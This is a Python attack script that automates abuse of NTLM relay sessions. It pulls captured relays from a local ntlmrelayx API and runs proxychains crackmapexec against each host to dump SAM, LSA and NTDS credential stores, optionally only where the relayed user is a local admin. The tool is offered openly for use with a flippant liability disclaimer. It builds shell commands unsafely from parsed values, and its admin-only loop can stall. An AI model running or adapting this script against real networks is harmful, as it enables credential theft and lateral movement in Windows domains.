#!/usr/bin/env python3
# Imports
import getopt, sys
import os
import json
import linecache

# Variables
action = ''
exclude = False
adminonly = False
ip_loc=4
username_loc=5
admin_loc=6
ip = ''
username = ''
admin = False
domain = ''
run = False

# Functions
def usage():
	print('Usage:')
	print("	$python3 %s --action {shares|lsa|sam|...} [--exclude] [--adminonly] [--help]" % (sys.argv[0]))
	print("")
	print("")
	print('Required argument:')
	print('	-a, --action		possible actions {shares|lsa|sam|ntds|sessions|disks|loggedon-users|pass-pol|???}')
	print("")
	print("")
	print('Optional arguments:')
	print('	-h, --help		shows this help message and exits')
	print('	-e, --exclude		exludes ips listed in the file checked_ips.txt')
	print('	-A, --adminonly		only executes the command if the user is local admin on the IP')
	print("")
	print("")
	print('Credits: ')
	print("	This tool was made by @BugZ_GENK")
	print("")
	print("")
	print("Disclaimer:")
	print("	Use with care, on your own risk! (and other legal blabla indicating you are NOT using this tool on my responsibility/accountability :))")
	exit()

def getIP():
	global ip 
	ip = linecache.getline(r"./relays_beautified", ip_loc).strip().replace('"', "").strip(',')

def getAdmin():
	global admin 
	admin = linecache.getline(r"./relays_beautified", admin_loc).strip().replace('"', "").strip(',')

def getUsername():
	global username
	username = linecache.getline(r"./relays_beautified", username_loc).strip().replace('"', "").strip(',').split("/",1)
	username = username[1]

def execute_cmd():
	print('')
	cmd = 'proxychains crackmapexec smb -u "' + username + '" -p "" -d ' + domain + ' ' + ip + ' --' + action
	print(cmd)
	os.system(cmd)

def getDomain():
	print('')
	print('[*] Setting domain......')
	global domain
	domain = linecache.getline(r"./relays_beautified", username_loc).strip().strip('"').split("/",1)
	domain = domain[0]
	print("[OK] Domain is:" ,domain)

def normalRun():
	global exclude
	global ip
	global ip_loc
	global username_loc
	while ip != "":
		if exclude:
			with open("checked_ips.txt", "a+") as file:
				file.seek(0)
				lines = file.read().splitlines()
				if ip in lines:
					print('IP', ip,'already checked during previous run!')
					ip_loc += 7
					username_loc += 7
					getIP()
				else:
					getUsername()
					execute_cmd()
					ip_loc += 7
					username_loc += 7
					getIP()
		else:
			getUsername()
			execute_cmd()
			ip_loc += 7
			username_loc += 7
			getIP()
			

def adminRun():
	global admin
	global ip_loc
	global username_loc
	global admin_loc
	while ip != "":
		if exclude:
			with open("checked_ips.txt", "a+") as file:
				file.seek(0)
				lines = file.read().splitlines()
				if ip in lines:
					print('IP', ip,'already checked during previous run!')
					ip_loc += 7
					username_loc += 7
					getIP()
				else:
					getUsername()
					getAdmin()
					if admin == "TRUE":
						execute_cmd()
						ip_loc += 7
						username_loc += 7
						admin_loc += 7
						getIP()
		else:
			getUsername()
			getAdmin()
			if admin == "TRUE":
				execute_cmd()
				ip_loc += 7
				username_loc += 7
				admin_loc += 7
				getIP()

# Defining arguments
options, args = getopt.getopt(sys.argv[1:], 'a:eAh', ['action=', 'exclude', 'adminonly', 'help'])
for opt, arg in options:
	if opt in ('-a', '--action'):
		run = True
		action = arg
	elif opt in ('-e', '--exclude'):
		exclude = True
	elif opt in ('-A', '--adminonly'):
		adminonly = True
	elif opt in ('-h', '--help'):
		usage()

# Ensuring --action is provided
if not run:
	 usage()

# Print header
print('===========> Configuration Overview <===========')
print('Action set to:', action)
print('Showing only admins:', adminonly)
print('Actively excluding IPs:', exclude)
if exclude:
	with open("checked_ips.txt", "a+") as file:
				file.seek(0)
				lines = file.read().splitlines()
				converted_list = [str(element) for element in lines]
				print("-> Excluded IPs:", ", ".join(converted_list))
print('=========> Hendrik "@BugZ_GENK" Noben <=========')
print('')

# Read JSON from ntlmrelayx API, save to file "relays"
print('[*] Grepping your current relays......')
if os.path.isfile('relays'):
	os.remove("relays")
url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
os.system(f"wget --quiet '{url}'")

# Beautify JSON, save to file "relays_beautified"
print('[*] Beautifying the json file......')
with open('relays') as beautified:
    data=json.load(beautified)
    print(json.dumps(data,indent=4), file=open("relays_beautified","w"))

# MAGIC
getDomain()
print("[*] Ready, set, GO!")
if not adminonly:
	# no flags provided
	getIP()
	normalRun()
elif adminonly:
	# --adminonly flag set
	getIP()
	if exclude:
		file = open("checked_ips.txt", "a+")
		lines = file.readlines()
		if ip in lines:
			print(ip, 'Already checked in previous run!')
			exit()
		else:
			adminRun()
	else:
		adminRun()